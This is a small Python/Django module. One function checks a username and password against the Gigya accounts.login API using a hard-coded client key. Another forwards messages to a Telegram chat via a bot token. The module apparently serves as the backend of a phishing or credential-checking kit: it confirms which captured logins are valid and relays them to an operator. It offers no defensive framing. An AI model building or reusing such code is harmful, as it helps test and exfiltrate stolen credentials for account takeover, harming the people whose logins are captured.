import requests

from django.conf import settings

from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
is_linux = False


def login(username: str, password: str):
    data = {
        'apiKey': '3_ywcUbXdwJgdV3shs6r4l7Crj9R8JPEK4nVfIQZM6pR6Q2OqAngN14lMN6xZSbTqg',
        'format': 'json',
        'httpStatusCodes': False,
        'include': 'profile%2Cdata%2Csubscriptions%2Cpreferences',
        'loginID': username,
        'password': password,
        'sdk': 'js_latest',
        'targetEnv': 'mobile'
    }
    res = requests.post('https://accounts.us1.gigya.com/accounts.login', data=data).json()

    if res['errorDetails'] == 'invalid loginID or password':
        return {'success': False, 'errorDetails': 'invalid loginID or password'}
    elif res['errorDetails'] == 'Pending Two-Factor Authentication':
        return {'success': True, 'message': 'Pending Two-Factor Authentication'}
    else:
        return {'success': False, 'errorDetails': 'invalid loginID or password'}



def sendMessage(message: str):
    url = "https://api.telegram.org/bot"+settings.TELEGERAM_BOT_TOKEN+"/sendMessage"
    params = {
        'chat_id': settings.CHAT_ID,
        'text': message,
        'parse_mode': 'html',
        'disable_web_page_preview':True
    }
    res = requests.get(url, params=params)
    print(res)